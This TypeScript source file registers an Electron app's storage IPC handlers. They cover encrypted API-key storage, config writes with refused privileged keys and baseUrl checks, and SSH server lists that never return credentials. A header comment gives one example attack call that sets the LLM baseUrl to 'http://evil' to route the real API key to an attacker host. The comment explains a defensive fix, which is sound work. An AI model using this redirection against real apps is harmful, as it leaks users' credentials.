/**
 * 存储 IPC Handlers
 *
 * 注册安全存储和配置存储相关的 IPC 通道：
 * - storage:saveApiKey / storage:hasApiKey / storage:deleteApiKey
 * - config:get / config:set / config:saveLlm
 * - server:list / server:save / server:export / server:import / server:delete-cred
 *
 * 这些通道不涉及 mainWindow 推送，全部是请求-响应模式。
 *
 * 边界纪律（2026-10-09 安全审查 P0-3 之后）：
 * - **凭据不出主进程**：server:list 只回 hasCredential；API Key 只回"存过没有"，
 *   不再有把解密原文递给渲染层的通道。
 * - **config:set 不是万能写盘**：带权限的键（LLM 配置、服务器列表、MCP 配置）一律拒，
 *   它们各有专门通道；否则渲染层一句 `configSet('llmConfig',{baseUrl:'http://evil'})`
 *   就能把真 API Key 引到攻击者主机（llm-config-resolver 会把两者合并进请求头）。
 */

import { ipcMain } from 'electron'
import { STORAGE, CONFIG, SERVER } from '@shared/ipc-channels'
import { SecureStore } from '../services/storage/secure-store'
import { ConfigStore } from '../services/storage/config-store'
import { assertSafeApiBaseUrl } from '../services/security/url-policy'
import { configKeyIsWritable, isPlainConfigValue } from '../services/storage/config-policy'
import { logger } from '../services/log/logger'
import type { LlmConfig, SshConfig } from '@shared/models'

/**
 * 注册存储相关 IPC handlers
 *
 * 此模块不需要 mainWindow 参数（所有操作都是同步请求-响应），
 * 但为保持注册函数签名一致，仍接收 mainWindow 参数（未使用）。
 */
export function registerStorageIpcHandlers(): void {
  // ------------------------------------------------------------------
  // 安全存储（API Key 加密）
  // ------------------------------------------------------------------

  /** storage:saveApiKey — 加密保存 API Key */
  ipcMain.handle(
    'storage:saveApiKey',
    async (_event, provider: string, key: string) => {
      return SecureStore.saveApiKey(provider, key)
    }
  )

  /** storage:hasApiKey — 只回"存过没有"，不回原文（原 getApiKey 通道已删） */
  ipcMain.handle(STORAGE.HAS_API_KEY, async (_event, provider: string) => {
    return SecureStore.getApiKey(provider) !== null
  })

  /** storage:deleteApiKey — 删除 API Key */
  ipcMain.handle(STORAGE.DELETE_API_KEY, async (_event, provider: string) => {
    return SecureStore.deleteApiKey(provider)
  })

  // ------------------------------------------------------------------
  // 配置存储（JSON 配置）
  // ------------------------------------------------------------------

  /** config:get — 读取配置 */
  ipcMain.handle(CONFIG.GET, async (_event, key: string) => {
    return ConfigStore.get(key)
  })

  /**
   * config:set — 写入**非权限性**配置
   *
   * 带权限的键（llmConfig / sshServers / mcpConfig / providers）一律拒：
   * 它们决定"真凭据被发往哪里、用哪把钥匙连哪台机器"，不能由一条自由键值通道改。
   */
  ipcMain.handle(CONFIG.SET, async (_event, key: string, value: unknown) => {
    if (!configKeyIsWritable(key)) {
      logger.warn('IPC.STORAGE', 'config:set 拒绝了带权限的配置键', { key: String(key).slice(0, 40) })
      return false
    }
    if (!isPlainConfigValue(value)) {
      logger.warn('IPC.STORAGE', 'config:set 拒绝了非纯数据值', { key: String(key).slice(0, 40) })
      return false
    }
    return ConfigStore.set(key, value)
  })

  /**
   * config:saveLlm — LLM 配置的专用写入口（带 baseUrl 策略）
   *
   * 校验不过就整条拒写并回原因：宁可设置保存失败，也不能让"渲染层可写的 baseUrl"
   * 与 SecureStore 里的真 key 被合并进同一个请求头。
   */
  ipcMain.handle(CONFIG.SAVE_LLM, async (_event, config: LlmConfig) => {
    if (!config || typeof config !== 'object') return { ok: false, error: 'LLM 配置形状不对' }
    const baseUrl = (config as LlmConfig).baseUrl
    if (baseUrl) {
      const policy = assertSafeApiBaseUrl(baseUrl)
      if (!policy.ok) {
        logger.warn('IPC.STORAGE', 'LLM baseUrl 被策略拒绝', { reason: policy.reason })
        return { ok: false, error: policy.reason }
      }
    }
    return { ok: ConfigStore.saveLlmConfig(config), error: undefined }
  })

  // ------------------------------------------------------------------
  // 服务器列表管理（敏感信息加密存储）
  // ------------------------------------------------------------------

  /** server:list — 加载服务器列表（**不含凭据**，只带 hasCredential） */
  ipcMain.handle(SERVER.LIST, async () => {
    return ConfigStore.loadServerListPublic()
  })

  /** server:save — 保存服务器列表（敏感信息加密存储） */
  ipcMain.handle(SERVER.SAVE, async (_event, servers: SshConfig[]) => {
    return ConfigStore.saveServerList(servers)
  })

  /** server:export — 导出服务器列表为 JSON（脱敏，不含密码/私钥） */
  ipcMain.handle(SERVER.EXPORT, async () => {
    return ConfigStore.exportServerList()
  })

  /** server:import — 导入服务器列表（生成新 ID，敏感信息留空） */
  ipcMain.handle(SERVER.IMPORT, async (_event, json: string) => {
    try {
      return ConfigStore.importServerList(json)
    } catch (err) {
      // 抛出用户可读的错误信息（不泄露 stack trace）
      throw new Error((err as Error).message)
    }
  })

  /** server:delete-cred — 删除服务器凭证 */
  ipcMain.handle(SERVER.DELETE_CRED, async (_event, serverId: string) => {
    return SecureStore.deleteServerCredential(serverId)
  })
}

